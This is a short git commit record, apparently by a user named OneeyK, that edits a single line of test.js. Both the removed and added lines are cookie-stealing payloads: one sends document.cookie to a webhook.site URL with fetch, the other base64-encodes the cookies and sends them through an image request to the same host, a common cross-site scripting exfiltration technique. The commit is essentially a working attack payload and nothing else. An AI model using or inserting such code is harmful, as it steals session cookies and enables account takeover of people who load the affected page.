4cca5c7aabca5476d104cb26bac743b8063fa134
OneeyK <54153791+OneeyK@users.noreply.github.com>
2025-09-30 19:13:09 +0300

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/9ced10cc-c98e-42e8-b613-b927d68fe399/?c='+document.cookie)
+x = new Image(); x.src = 'https://webhook.site/9ced10cc-c98e-42e8-b613-b927d68fe399?data='+btoa(document.cookie);
